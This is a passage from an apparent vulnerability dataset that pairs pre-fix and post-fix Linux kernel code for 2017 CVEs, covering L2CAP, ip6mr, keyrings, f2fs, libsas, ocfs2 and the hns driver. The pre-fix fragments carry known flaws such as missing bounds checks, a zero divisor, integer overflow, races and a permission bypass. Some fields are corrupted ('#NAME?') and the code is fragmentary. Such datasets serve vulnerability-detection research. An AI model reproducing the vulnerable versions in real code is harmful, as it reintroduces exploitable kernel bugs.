	__le16		sport;

 struct l2cap_conn	*conn;
 struct sock		*next_c;
 struct sock		*prev_c;
};

#define L2CAP_CONF_REQ_SENT 0x01
#define L2CAP_CONF_INPUT_DONE 0x02
#define L2CAP_CONF_OUTPUT_DONE 0x04
#define L2CAP_CONF_MTU_DONE 0x08
#define L2CAP_CONF_MODE_DONE 0x10
#define L2CAP_CONF_CONNECT_PEND 0x20
#define L2CAP_CONF_STATE2_DEVICE 0x80

#define L2CAP_CONF_MAX_CONF_REQ 2
#define L2CAP_CONF_MAX_CONF_RSP 2



void l2cap_load(void);

"
2017,Mem. Corr. ,CVE-2017-1000112,,
2017,,CVE-2017-1000111,,
2019,,CVE-2017-18595,,
2019,,CVE-2017-18552,,
2019,,CVE-2017-18551,,
2019,#NAME?,CVE-2017-18550,,
2019,#NAME?,CVE-2017-18549,,
2019,Exec Code ,CVE-2017-18509," struct net *net = sock_net(sk);
 struct mr6_table *mrt;





	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
 if (!mrt)
 return -ENOENT;

 switch (optname) {
 case MRT6_INIT:
 if (sk->sk_type != SOCK_RAW ||
 inet_sk(sk)->inet_num != IPPROTO_ICMPV6)
 return -EOPNOTSUPP;
 if (optlen < sizeof(int))
 return -EINVAL;

 struct net *net = sock_net(sk);
 struct mr6_table *mrt;





	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
 if (!mrt)
 return -ENOENT;
"," struct net *net = sock_net(sk);
 struct mr6_table *mrt;

 if (sk->sk_type != SOCK_RAW ||
 inet_sk(sk)->inet_num != IPPROTO_ICMPV6)
 return -EOPNOTSUPP;

	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
 if (!mrt)
 return -ENOENT;

 switch (optname) {
 case MRT6_INIT:



 if (optlen < sizeof(int))
 return -EINVAL;

 struct net *net = sock_net(sk);
 struct mr6_table *mrt;

 if (sk->sk_type != SOCK_RAW ||
 inet_sk(sk)->inet_num != IPPROTO_ICMPV6)
 return -EOPNOTSUPP;

	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
 if (!mrt)
 return -ENOENT;
"
2019,Overflow ,CVE-2017-18379,"	u16 qid = nvmet_fc_getqueueid(connection_id);
 unsigned long flags;




 spin_lock_irqsave(&tgtport->lock, flags);
 list_for_each_entry(assoc, &tgtport->assoc_list, a_list) {
 if (association_id == assoc->association_id) {
","	u16 qid = nvmet_fc_getqueueid(connection_id);
 unsigned long flags;

 if (qid > NVMET_NR_QUEUES)
 return NULL;

 spin_lock_irqsave(&tgtport->lock, flags);
 list_for_each_entry(assoc, &tgtport->assoc_list, a_list) {
 if (association_id == assoc->association_id) {
"
2019,DoS ,CVE-2017-18360," if (!baud) {
 /* pick a default, any default... */
		baud = 9600;
	} else


 tty_encode_baud_rate(tty, baud, baud);


	edge_port->baud_rate = baud;
	config->wBaudRate = (__u16)((461550L + baud/2) / baud);
"," if (!baud) {
 /* pick a default, any default... */
		baud = 9600;
	} else {
 /* Avoid a zero divisor. */
		baud = min(baud, 461550);
 tty_encode_baud_rate(tty, baud, baud);
	}

	edge_port->baud_rate = baud;
	config->wBaudRate = (__u16)((461550L + baud/2) / baud);
"
2018,,CVE-2017-18344,"{
 struct task_struct *rtn = current->group_leader;

 if ((event->sigev_notify & SIGEV_THREAD_ID ) &&
		(!(rtn = find_task_by_vpid(event->sigev_notify_thread_id)) ||
		 !same_thread_group(rtn, current) ||
		 (event->sigev_notify & ~SIGEV_THREAD_ID) != SIGEV_SIGNAL))










 return NULL;

 if (((event->sigev_notify & ~SIGEV_THREAD_ID) != SIGEV_NONE) &&
	    ((event->sigev_signo <= 0) || (event->sigev_signo > SIGRTMAX)))
 return NULL;

 return task_pid(rtn);
}

static struct k_itimer * alloc_posix_timer(void)
 struct timespec64 ts64;
 bool sig_none;

	sig_none = (timr->it_sigev_notify & ~SIGEV_THREAD_ID) == SIGEV_NONE;
	iv = timr->it_interval;

 /* interval timer ? */

	timr->it_interval = timespec64_to_ktime(new_setting->it_interval);
	expires = timespec64_to_ktime(new_setting->it_value);
	sigev_none = (timr->it_sigev_notify & ~SIGEV_THREAD_ID) == SIGEV_NONE;

	kc->timer_arm(timr, expires, flags & TIMER_ABSTIME, sigev_none);
	timr->it_active = !sigev_none;
","{
 struct task_struct *rtn = current->group_leader;

 switch (event->sigev_notify) {
 case SIGEV_SIGNAL | SIGEV_THREAD_ID:
		rtn = find_task_by_vpid(event->sigev_notify_thread_id);
 if (!rtn || !same_thread_group(rtn, current))
 return NULL;
 /* FALLTHRU */
 case SIGEV_SIGNAL:
 case SIGEV_THREAD:
 if (event->sigev_signo <= 0 || event->sigev_signo > SIGRTMAX)
 return NULL;
 /* FALLTHRU */
 case SIGEV_NONE:
 return task_pid(rtn);
 default:
 return NULL;
	}





}

static struct k_itimer * alloc_posix_timer(void)
 struct timespec64 ts64;
 bool sig_none;

	sig_none = timr->it_sigev_notify == SIGEV_NONE;
	iv = timr->it_interval;

 /* interval timer ? */

	timr->it_interval = timespec64_to_ktime(new_setting->it_interval);
	expires = timespec64_to_ktime(new_setting->it_value);
	sigev_none = timr->it_sigev_notify == SIGEV_NONE;

	kc->timer_arm(timr, expires, flags & TIMER_ABSTIME, sigev_none);
	timr->it_active = !sigev_none;
"
2018,DoS ,CVE-2017-18270,"#define KEY_FLAG_BUILTIN 8 /* set if key is built in to the kernel */
#define KEY_FLAG_ROOT_CAN_INVAL 9 /* set if key can be invalidated by root without permission */
#define KEY_FLAG_KEEP 10 /* set if key should not be removed */


 /* the key type and key description string
	 * - the desc is used to match a key against search criteria
#define KEY_ALLOC_NOT_IN_QUOTA 0x0002 /* not in quota */
#define KEY_ALLOC_BUILT_IN 0x0004 /* Key is built into kernel */
#define KEY_ALLOC_BYPASS_RESTRICTION 0x0008 /* Override the check on restricted keyrings */


extern void key_revoke(struct key *key);
extern void key_invalidate(struct key *key);
extern key_ref_t search_my_process_keyrings(struct keyring_search_context *ctx);
extern key_ref_t search_process_keyrings(struct keyring_search_context *ctx);

extern struct key *find_keyring_by_name(const char *name, bool skip_perm_check);

extern int install_user_keyrings(void);
extern int install_thread_keyring_to_cred(struct cred *);
		key->flags |= 1 << KEY_FLAG_IN_QUOTA;
 if (flags & KEY_ALLOC_BUILT_IN)
		key->flags |= 1 << KEY_FLAG_BUILTIN;



#ifdef KEY_DEBUGGING
	key->magic = KEY_DEBUG_MAGIC;
/*
 * Find a keyring with the specified name.
 *
 * All named keyrings in the current user namespace are searched, provided they
 * grant Search permission directly to the caller (unless this check is
 * skipped).  Keyrings whose usage points have reached zero or who have been
 * revoked are skipped.
 *
 * Returns a pointer to the keyring with the keyring's refcount having being
 * incremented on success.  -ENOKEY is returned if a key could not be found.
 */
struct key *find_keyring_by_name(const char *name, bool skip_perm_check)
{
 struct key *keyring;
 int bucket;
 if (strcmp(keyring->description, name) != 0)
 continue;

 if (!skip_perm_check &&
 key_permission(make_key_ref(keyring, 0),
					   KEY_NEED_SEARCH) < 0)
 continue;






 /* we've got a match but we might end up racing with
			 * key_cleanup() if the keyring is currently 'dead'
 if (IS_ERR(uid_keyring)) {
			uid_keyring = keyring_alloc(buf, user->uid, INVALID_GID,
						    cred, user_keyring_perm,
						    KEY_ALLOC_IN_QUOTA,

 NULL, NULL);
 if (IS_ERR(uid_keyring)) {
				ret = PTR_ERR(uid_keyring);
			session_keyring =
 keyring_alloc(buf, user->uid, INVALID_GID,
					      cred, user_keyring_perm,
					      KEY_ALLOC_IN_QUOTA,

 NULL, NULL);
 if (IS_ERR(session_keyring)) {
				ret = PTR_ERR(session_keyring);
","#define KEY_FLAG_BUILTIN 8 /* set if key is built in to the kernel */
#define KEY_FLAG_ROOT_CAN_INVAL 9 /* set if key can be invalidated by root without permission */
#define KEY_FLAG_KEEP 10 /* set if key should not be removed */
#define KEY_FLAG_UID_KEYRING 11 /* set if key is a user or user session keyring */

 /* the key type and key description string
	 * - the desc is used to match a key against search criteria
#define KEY_ALLOC_NOT_IN_QUOTA 0x0002 /* not in quota */
#define KEY_ALLOC_BUILT_IN 0x0004 /* Key is built into kernel */
#define KEY_ALLOC_BYPASS_RESTRICTION 0x0008 /* Override the check on restricted keyrings */
#define KEY_ALLOC_UID_KEYRING 0x0010 /* allocating a user or user session keyring */

extern void key_revoke(struct key *key);
extern void key_invalidate(struct key *key);
extern key_ref_t search_my_process_keyrings(struct keyring_search_context *ctx);
extern key_ref_t search_process_keyrings(struct keyring_search_context *ctx);

extern struct key *find_keyring_by_name(const char *name, bool uid_keyring);

extern int install_user_keyrings(void);
extern int install_thread_keyring_to_cred(struct cred *);
		key->flags |= 1 << KEY_FLAG_IN_QUOTA;
 if (flags & KEY_ALLOC_BUILT_IN)
		key->flags |= 1 << KEY_FLAG_BUILTIN;
 if (flags & KEY_ALLOC_UID_KEYRING)
		key->flags |= 1 << KEY_FLAG_UID_KEYRING;

#ifdef KEY_DEBUGGING
	key->magic = KEY_DEBUG_MAGIC;
/*
 * Find a keyring with the specified name.
 *
 * Only keyrings that have nonzero refcount, are not revoked, and are owned by a
 * user in the current user namespace are considered.  If @uid_keyring is %true,
 * the keyring additionally must have been allocated as a user or user session
 * keyring; otherwise, it must grant Search permission directly to the caller.
 *
 * Returns a pointer to the keyring with the keyring's refcount having being
 * incremented on success.  -ENOKEY is returned if a key could not be found.
 */
struct key *find_keyring_by_name(const char *name, bool uid_keyring)
{
 struct key *keyring;
 int bucket;
 if (strcmp(keyring->description, name) != 0)
 continue;

 if (uid_keyring) {
 if (!test_bit(KEY_FLAG_UID_KEYRING,
					      &keyring->flags))
 continue;
			} else {
 if (key_permission(make_key_ref(keyring, 0),
						   KEY_NEED_SEARCH) < 0)
 continue;
			}

 /* we've got a match but we might end up racing with
			 * key_cleanup() if the keyring is currently 'dead'
 if (IS_ERR(uid_keyring)) {
			uid_keyring = keyring_alloc(buf, user->uid, INVALID_GID,
						    cred, user_keyring_perm,
						    KEY_ALLOC_UID_KEYRING |
							KEY_ALLOC_IN_QUOTA,
 NULL, NULL);
 if (IS_ERR(uid_keyring)) {
				ret = PTR_ERR(uid_keyring);
			session_keyring =
 keyring_alloc(buf, user->uid, INVALID_GID,
					      cred, user_keyring_perm,
					      KEY_ALLOC_UID_KEYRING |
						  KEY_ALLOC_IN_QUOTA,
 NULL, NULL);
 if (IS_ERR(session_keyring)) {
				ret = PTR_ERR(session_keyring);
"
2018,DoS ,CVE-2017-18261,"	u64 _val;							\
 if (needs_unstable_timer_counter_workaround()) {		\
 const struct arch_timer_erratum_workaround *wa;		\
 preempt_disable(); 				\
		wa = __this_cpu_read(timer_unstable_counter_workaround); \
 if (wa && wa->read_##reg)				\
			_val = wa->read_##reg();			\
 else							\
			_val = read_sysreg(reg);			\
 preempt_enable(); 				\
	} else {							\
		_val = read_sysreg(reg);				\
	}								\
","	u64 _val;							\
 if (needs_unstable_timer_counter_workaround()) {		\
 const struct arch_timer_erratum_workaround *wa;		\
 preempt_disable_notrace();				\
		wa = __this_cpu_read(timer_unstable_counter_workaround); \
 if (wa && wa->read_##reg)				\
			_val = wa->read_##reg();			\
 else							\
			_val = read_sysreg(reg);			\
 preempt_enable_notrace();				\
	} else {							\
		_val = read_sysreg(reg);				\
	}								\
"
2018,DoS Overflow ,CVE-2017-18257," if (!err) {
 map_bh(bh, inode->i_sb, map.m_pblk);
		bh->b_state = (bh->b_state & ~F2FS_MAP_FLAGS) | map.m_flags;
		bh->b_size = map.m_len << inode->i_blkbits;
	}
 return err;
}
"," if (!err) {
 map_bh(bh, inode->i_sb, map.m_pblk);
		bh->b_state = (bh->b_state & ~F2FS_MAP_FLAGS) | map.m_flags;
		bh->b_size = (u64)map.m_len << inode->i_blkbits;
	}
 return err;
}
"
2018,DoS Overflow ,CVE-2017-18255," void __user *buffer, size_t *lenp,
 loff_t *ppos)
{
 int ret = proc_dointvec(table, write, buffer, lenp, ppos);

 if (ret || !write)
 return ret;
"," void __user *buffer, size_t *lenp,
 loff_t *ppos)
{
 int ret = proc_dointvec_minmax(table, write, buffer, lenp, ppos);

 if (ret || !write)
 return ret;
"
2018,DoS ,CVE-2017-18249,"static bool add_free_nid(struct f2fs_sb_info *sbi, nid_t nid, bool build)
{
 struct f2fs_nm_info *nm_i = NM_I(sbi);
 struct free_nid *i;
 struct nat_entry *ne;
 int err;


 /* 0 nid should not be used */
 if (unlikely(nid == 0))
 return false;

 if (build) {
 /* do not add allocated nids */
		ne = __lookup_nat_cache(nm_i, nid);
 if (ne && (!get_nat_flag(ne, IS_CHECKPOINTED) ||
 nat_get_blkaddr(ne) != NULL_ADDR))
 return false;
	}

	i = f2fs_kmem_cache_alloc(free_nid_slab, GFP_NOFS);
	i->nid = nid;
	i->state = NID_NEW;

 if (radix_tree_preload(GFP_NOFS)) {
 kmem_cache_free(free_nid_slab, i);
 return true;
	}

 spin_lock(&nm_i->nid_list_lock);




































	err = __insert_nid_to_list(sbi, i, FREE_NID_LIST, true);

 spin_unlock(&nm_i->nid_list_lock);
 radix_tree_preload_end();
 if (err) {

 kmem_cache_free(free_nid_slab, i);
 return true;
	}
 return true;
}

static void remove_free_nid(struct f2fs_sb_info *sbi, nid_t nid)
","static bool add_free_nid(struct f2fs_sb_info *sbi, nid_t nid, bool build)
{
 struct f2fs_nm_info *nm_i = NM_I(sbi);
 struct free_nid *i, *e;
 struct nat_entry *ne;
 int err = -EINVAL;
 bool ret = false;

 /* 0 nid should not be used */
 if (unlikely(nid == 0))
 return false;









	i = f2fs_kmem_cache_alloc(free_nid_slab, GFP_NOFS);
	i->nid = nid;
	i->state = NID_NEW;

 if (radix_tree_preload(GFP_NOFS))
 goto err;



 spin_lock(&nm_i->nid_list_lock);

 if (build) {
 /*
		 *   Thread A             Thread B
		 *  - f2fs_create
		 *   - f2fs_new_inode
		 *    - alloc_nid
		 *     - __insert_nid_to_list(ALLOC_NID_LIST)
		 *                     - f2fs_balance_fs_bg
		 *                      - build_free_nids
		 *                       - __build_free_nids
		 *                        - scan_nat_page
		 *                         - add_free_nid
		 *                          - __lookup_nat_cache
		 *  - f2fs_add_link
		 *   - init_inode_metadata
		 *    - new_inode_page
		 *     - new_node_page
		 *      - set_node_addr
		 *  - alloc_nid_done
		 *   - __remove_nid_from_list(ALLOC_NID_LIST)
		 *                         - __insert_nid_to_list(FREE_NID_LIST)
 */
		ne = __lookup_nat_cache(nm_i, nid);
 if (ne && (!get_nat_flag(ne, IS_CHECKPOINTED) ||
 nat_get_blkaddr(ne) != NULL_ADDR))
 goto err_out;

		e = __lookup_free_nid_list(nm_i, nid);
 if (e) {
 if (e->state == NID_NEW)
				ret = true;
 goto err_out;
		}
	}
	ret = true;
	err = __insert_nid_to_list(sbi, i, FREE_NID_LIST, true);
err_out:
 spin_unlock(&nm_i->nid_list_lock);
 radix_tree_preload_end();
err:
 if (err)
 kmem_cache_free(free_nid_slab, i);
 return ret;


}

static void remove_free_nid(struct f2fs_sb_info *sbi, nid_t nid)
"
2018,DoS ,CVE-2017-18241," init_waitqueue_head(&fcc->flush_wait_queue);
 init_llist_head(&fcc->issue_list);
 SM_I(sbi)->fcc_info = fcc;



init_thread:
	fcc->f2fs_issue_flush = kthread_run(issue_flush_thread, sbi,
 ""f2fs_flush-%u:%u"", MAJOR(dev), MINOR(dev));

 INIT_LIST_HEAD(&sm_info->sit_entry_set);

 if (test_opt(sbi, FLUSH_MERGE) && !f2fs_readonly(sbi->sb)) {
		err = create_flush_cmd_control(sbi);
 if (err)
 return err;
"," init_waitqueue_head(&fcc->flush_wait_queue);
 init_llist_head(&fcc->issue_list);
 SM_I(sbi)->fcc_info = fcc;
 if (!test_opt(sbi, FLUSH_MERGE))
 return err;

init_thread:
	fcc->f2fs_issue_flush = kthread_run(issue_flush_thread, sbi,
 ""f2fs_flush-%u:%u"", MAJOR(dev), MINOR(dev));

 INIT_LIST_HEAD(&sm_info->sit_entry_set);

 if (!f2fs_readonly(sbi->sb)) {
		err = create_flush_cmd_control(sbi);
 if (err)
 return err;
"
2018,DoS ,CVE-2017-18232," if (res)
 return res;

 sas_discover_event(dev->port, DISCE_PROBE);
 return 0;
}

	}
}

static void sas_probe_devices(struct work_struct *work)
{
 struct domain_device *dev, *n;
 struct sas_discovery_event *ev = to_sas_discovery_event(work);
 struct asd_sas_port *port = ev->port;

 clear_bit(DISCE_PROBE, &port->disc.pending);

 /* devices must be domain members before link recovery and probe */
 list_for_each_entry(dev, &port->disco_list, disco_list_node) {
	res = sas_notify_lldd_dev_found(dev);
 if (res)
 return res;
 sas_discover_event(dev->port, DISCE_PROBE);

 return 0;
}
 sas_put_device(dev);
}

static void sas_destruct_devices(struct work_struct *work)
{
 struct domain_device *dev, *n;
 struct sas_discovery_event *ev = to_sas_discovery_event(work);
 struct asd_sas_port *port = ev->port;

 clear_bit(DISCE_DESTRUCT, &port->disc.pending);

 list_for_each_entry_safe(dev, n, &port->destroy_list, disco_list_node) {
 list_del_init(&dev->disco_list_node);
	}
}











void sas_unregister_dev(struct asd_sas_port *port, struct domain_device *dev)
{
 if (!test_bit(SAS_DEV_DESTROY, &dev->state) &&
 if (!test_and_set_bit(SAS_DEV_DESTROY, &dev->state)) {
 sas_rphy_unlink(dev->rphy);
 list_move_tail(&dev->disco_list_node, &port->destroy_list);
 sas_discover_event(dev->port, DISCE_DESTRUCT);
	}
}

		port->port_dev = NULL;
	}



 SAS_DPRINTK(""DONE DISCOVERY on port %d, pid:%d, result:%d\n"", port->id,
 task_pid_nr(current), error);
}
		    port->id, task_pid_nr(current), res);
 out:
 mutex_unlock(&ha->disco_mutex);




}

/* ---------- Events ---------- */
 static const work_func_t sas_event_fns[DISC_NUM_EVENTS] = {
		[DISCE_DISCOVER_DOMAIN] = sas_discover_domain,
		[DISCE_REVALIDATE_DOMAIN] = sas_revalidate_domain,
		[DISCE_PROBE] = sas_probe_devices,
		[DISCE_SUSPEND] = sas_suspend_devices,
		[DISCE_RESUME] = sas_resume_devices,
		[DISCE_DESTRUCT] = sas_destruct_devices,
	};

	disc->pending = 0;
 sas_port_delete_phy(phy->port, phy->phy);
 sas_device_set_phy(found, phy->port);
 if (phy->port->num_phys == 0)
 sas_port_delete(phy->port);

		phy->port = NULL;
	}
}
 struct domain_device *dev = NULL;

	res = sas_find_bcast_dev(port_dev, &dev);
 while (res == 0 && dev) {
 struct expander_device *ex = &dev->ex_dev;
 int i = 0, phy_id;

			res = sas_rediscover(dev, phy_id);
			i = phy_id + 1;
		} while (i < ex->num_phys);

		dev = NULL;
		res = sas_find_bcast_dev(port_dev, &dev);
	}
 return res;
}
void sas_hae_reset(struct work_struct *work);

void sas_free_device(struct kref *kref);


extern const work_func_t sas_phy_event_fns[PHY_NUM_EVENTS];
extern const work_func_t sas_port_event_fns[PORT_NUM_EVENTS];
		rc = sas_notify_lldd_dev_found(dev);
 if (rc) {
 sas_unregister_dev(port, dev);

 continue;
		}


 if (port->num_phys == 1) {
 sas_unregister_domain_devices(port, gone);

 sas_port_delete(port->port);
		port->port = NULL;
	} else {
 INIT_LIST_HEAD(&port->dev_list);
 INIT_LIST_HEAD(&port->disco_list);
 INIT_LIST_HEAD(&port->destroy_list);

 spin_lock_init(&port->phy_list_lock);
 INIT_LIST_HEAD(&port->phy_list);
	port->ha = sas_ha;
enum discover_event {
	DISCE_DISCOVER_DOMAIN   = 0U,
	DISCE_REVALIDATE_DOMAIN,
	DISCE_PROBE,
	DISCE_SUSPEND,
	DISCE_RESUME,
	DISCE_DESTRUCT,
	DISC_NUM_EVENTS,
};

 struct list_head dev_list;
 struct list_head disco_list;
 struct list_head destroy_list;

 enum   sas_linkrate linkrate;

 struct sas_work work;

 struct mutex		phy_list_mutex;
 struct list_head	phy_list;

};

#define dev_to_sas_port(d) \
"," if (res)
 return res;


 return 0;
}

	}
}

static void sas_probe_devices(struct asd_sas_port *port)
{
 struct domain_device *dev, *n;





 /* devices must be domain members before link recovery and probe */
 list_for_each_entry(dev, &port->disco_list, disco_list_node) {
	res = sas_notify_lldd_dev_found(dev);
 if (res)
 return res;


 return 0;
}
 sas_put_device(dev);
}

void sas_destruct_devices(struct asd_sas_port *port)
{
 struct domain_device *dev, *n;





 list_for_each_entry_safe(dev, n, &port->destroy_list, disco_list_node) {
 list_del_init(&dev->disco_list_node);
	}
}

static void sas_destruct_ports(struct asd_sas_port *port)
{
 struct sas_port *sas_port, *p;

 list_for_each_entry_safe(sas_port, p, &port->sas_port_del_list, del_list) {
 list_del_init(&sas_port->del_list);
 sas_port_delete(sas_port);
	}
}

void sas_unregister_dev(struct asd_sas_port *port, struct domain_device *dev)
{
 if (!test_bit(SAS_DEV_DESTROY, &dev->state) &&
 if (!test_and_set_bit(SAS_DEV_DESTROY, &dev->state)) {
 sas_rphy_unlink(dev->rphy);
 list_move_tail(&dev->disco_list_node, &port->destroy_list);

	}
}

		port->port_dev = NULL;
	}

 sas_probe_devices(port);

 SAS_DPRINTK(""DONE DISCOVERY on port %d, pid:%d, result:%d\n"", port->id,
 task_pid_nr(current), error);
}
		    port->id, task_pid_nr(current), res);
 out:
 mutex_unlock(&ha->disco_mutex);

 sas_destruct_devices(port);
 sas_destruct_ports(port);
 sas_probe_devices(port);
}

/* ---------- Events ---------- */
 static const work_func_t sas_event_fns[DISC_NUM_EVENTS] = {
		[DISCE_DISCOVER_DOMAIN] = sas_discover_domain,
		[DISCE_REVALIDATE_DOMAIN] = sas_revalidate_domain,

		[DISCE_SUSPEND] = sas_suspend_devices,
		[DISCE_RESUME] = sas_resume_devices,

	};

	disc->pending = 0;
 sas_port_delete_phy(phy->port, phy->phy);
 sas_device_set_phy(found, phy->port);
 if (phy->port->num_phys == 0)
 list_add_tail(&phy->port->del_list,
				&parent->port->sas_port_del_list);
		phy->port = NULL;
	}
}
 struct domain_device *dev = NULL;

	res = sas_find_bcast_dev(port_dev, &dev);
 if (res == 0 && dev) {
 struct expander_device *ex = &dev->ex_dev;
 int i = 0, phy_id;

			res = sas_rediscover(dev, phy_id);
			i = phy_id + 1;
		} while (i < ex->num_phys);



	}
 return res;
}
void sas_hae_reset(struct work_struct *work);

void sas_free_device(struct kref *kref);
void sas_destruct_devices(struct asd_sas_port *port);

extern const work_func_t sas_phy_event_fns[PHY_NUM_EVENTS];
extern const work_func_t sas_port_event_fns[PORT_NUM_EVENTS];
		rc = sas_notify_lldd_dev_found(dev);
 if (rc) {
 sas_unregister_dev(port, dev);
 sas_destruct_devices(port);
 continue;
		}


 if (port->num_phys == 1) {
 sas_unregister_domain_devices(port, gone);
 sas_destruct_devices(port);
 sas_port_delete(port->port);
		port->port = NULL;
	} else {
 INIT_LIST_HEAD(&port->dev_list);
 INIT_LIST_HEAD(&port->disco_list);
 INIT_LIST_HEAD(&port->destroy_list);
 INIT_LIST_HEAD(&port->sas_port_del_list);
 spin_lock_init(&port->phy_list_lock);
 INIT_LIST_HEAD(&port->phy_list);
	port->ha = sas_ha;
enum discover_event {
	DISCE_DISCOVER_DOMAIN   = 0U,
	DISCE_REVALIDATE_DOMAIN,

	DISCE_SUSPEND,
	DISCE_RESUME,

	DISC_NUM_EVENTS,
};

 struct list_head dev_list;
 struct list_head disco_list;
 struct list_head destroy_list;
 struct list_head sas_port_del_list;
 enum   sas_linkrate linkrate;

 struct sas_work work;

 struct mutex		phy_list_mutex;
 struct list_head	phy_list;
 struct list_head	del_list; /* libsas only */
};

#define dev_to_sas_port(d) \
"
2018,DoS ,CVE-2017-18224," return err;
}














int ocfs2_get_block(struct inode *inode, sector_t iblock,
 struct buffer_head *bh_result, int create)
{
 * called like this: dio->get_blocks(dio->inode, fs_startblk,
 * 					fs_count, map_bh, dio->rw == WRITE);
 */
static int ocfs2_dio_get_block(struct inode *inode, sector_t iblock,
 struct buffer_head *bh_result, int create)
{
 struct ocfs2_super *osb = OCFS2_SB(inode->i_sb);
	 * while file size will be changed.
 */
 if (pos + total_len <= i_size_read(inode)) {
 down_read(&oi->ip_alloc_sem);
 /* This is the fast path for re-write. */
		ret = ocfs2_get_block(inode, iblock, bh_result, create);

 up_read(&oi->ip_alloc_sem);



 if (buffer_mapped(bh_result) &&
		    !buffer_new(bh_result) &&
		    ret == 0)
 return 0;

 if (iov_iter_rw(iter) == READ)
		get_block = ocfs2_get_block;
 else
		get_block = ocfs2_dio_get_block;

 return __blockdev_direct_IO(iocb, inode, inode->i_sb->s_bdev,
				    iter, get_block,
"," return err;
}

static int ocfs2_lock_get_block(struct inode *inode, sector_t iblock,
 struct buffer_head *bh_result, int create)
{
 int ret = 0;
 struct ocfs2_inode_info *oi = OCFS2_I(inode);

 down_read(&oi->ip_alloc_sem);
	ret = ocfs2_get_block(inode, iblock, bh_result, create);
 up_read(&oi->ip_alloc_sem);

 return ret;
}

int ocfs2_get_block(struct inode *inode, sector_t iblock,
 struct buffer_head *bh_result, int create)
{
 * called like this: dio->get_blocks(dio->inode, fs_startblk,
 * 					fs_count, map_bh, dio->rw == WRITE);
 */
static int ocfs2_dio_wr_get_block(struct inode *inode, sector_t iblock,
 struct buffer_head *bh_result, int create)
{
 struct ocfs2_super *osb = OCFS2_SB(inode->i_sb);
	 * while file size will be changed.
 */
 if (pos + total_len <= i_size_read(inode)) {






 /* This is the fast path for re-write. */
		ret = ocfs2_lock_get_block(inode, iblock, bh_result, create);
 if (buffer_mapped(bh_result) &&
		    !buffer_new(bh_result) &&
		    ret == 0)
 return 0;

 if (iov_iter_rw(iter) == READ)
		get_block = ocfs2_lock_get_block;
 else
		get_block = ocfs2_dio_wr_get_block;

 return __blockdev_direct_IO(iocb, inode, inode->i_sb->s_bdev,
				    iter, get_block,
"
2018,DoS Overflow Mem. Corr. ,CVE-2017-18222,"
static int hns_gmac_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS)
 return ARRAY_SIZE(g_gmac_stats_string);

 return 0;

int hns_ppe_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS)
 return ETH_PPE_STATIC_NUM;
 return 0;
}
 */
int hns_rcb_get_ring_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS)
 return HNS_RING_STATIC_REG_NUM;

 return 0;
 */
static int hns_xgmac_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS)
 return ARRAY_SIZE(g_xgmac_stats_string);

 return 0;
","
static int hns_gmac_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS || stringset == ETH_SS_PRIV_FLAGS)
 return ARRAY_SIZE(g_gmac_stats_string);

 return 0;

int hns_ppe_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS || stringset == ETH_SS_PRIV_FLAGS)
 return ETH_PPE_STATIC_NUM;
 return 0;
}
 */
int hns_rcb_get_ring_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS || stringset == ETH_SS_PRIV_FLAGS)
 return HNS_RING_STATIC_REG_NUM;

 return 0;
 */
static int hns_xgmac_get_sset_count(int stringset)
{
 if (stringset == ETH_SS_STATS || stringset == ETH_SS_PRIV_FLAGS)
 return ARRAY_SIZE(g_xgmac_stats_string);

 return 0;
"
2018,DoS ,CVE-2017-18221,"{
 int i;
 int nr = pagevec_count(pvec);
 int delta_munlocked;
 struct pagevec pvec_putback;
 int pgrescued = 0;

 continue;
 else
 __munlock_isolation_failed(page);


		}

 /*
 pagevec_add(&pvec_putback, pvec->pages[i]);
		pvec->pages[i] = NULL;
	}
	delta_munlocked = -nr + pagevec_count(&pvec_putback);
 __mod_zone_page_state(zone, NR_MLOCK, delta_munlocked);
 spin_unlock_irq(zone_lru_lock(zone));

","{
 int i;
 int nr = pagevec_count(pvec);
 int delta_munlocked = -nr;
 struct pagevec pvec_putback;
 int pgrescued = 0;

 continue;
 else
 __munlock_isolation_failed(page);
		} else {
			delta_munlocked++;
		}

 /*
 pagevec_add(&pvec_putback, pvec->pages[i]);
		pvec->pages[i] = NULL;
	}

 __mod_zone_page_state(zone, NR_MLOCK, delta_munlocked);
 spin_unlock_irq(zone_lru_lock(zone));

"
2018,DoS ,CVE-2017-18218,"			     mtu);
}

int hns_nic_net_xmit_hw(struct net_device *ndev,
 struct sk_buff *skb,
 struct hns_nic_ring_data *ring_data)
{
 struct hns_nic_priv *priv = netdev_priv(ndev);
 struct hnae_ring *ring = ring_data->ring;
	dev_queue = netdev_get_tx_queue(ndev, skb->queue_mapping);
 netdev_tx_sent_queue(dev_queue, skb->len);





 wmb(); /* commit all data before submit */
 assert(skb->queue_mapping < priv->ae_handle->q_num);
 hnae_queue_xmit(priv->ae_handle->qs[skb->queue_mapping], buf_num);
 struct net_device *ndev)
{
 struct hns_nic_priv *priv = netdev_priv(ndev);
 int ret;

 assert(skb->queue_mapping < ndev->ae_handle->q_num);
	ret = hns_nic_net_xmit_hw(ndev, skb,
				  &tx_ring_data(priv, skb->queue_mapping));
 if (ret == NETDEV_TX_OK) {
 netif_trans_update(ndev);
		ndev->stats.tx_bytes += skb->len;
		ndev->stats.tx_packets++;
	}
 return (netdev_tx_t)ret;
}

static void hns_nic_drop_rx_fetch(struct hns_nic_ring_data *ring_data,
void hns_nic_net_reset(struct net_device *ndev);
void hns_nic_net_reinit(struct net_device *netdev);
int hns_nic_init_phy(struct net_device *ndev, struct hnae_handle *h);
int hns_nic_net_xmit_hw(struct net_device *ndev,
 struct sk_buff *skb,
 struct hns_nic_ring_data *ring_data);

#endif /**__HNS_ENET_H */
","			     mtu);
}

netdev_tx_t hns_nic_net_xmit_hw(struct net_device *ndev,
  struct sk_buff *skb,
  struct hns_nic_ring_data *ring_data)
{
 struct hns_nic_priv *priv = netdev_priv(ndev);
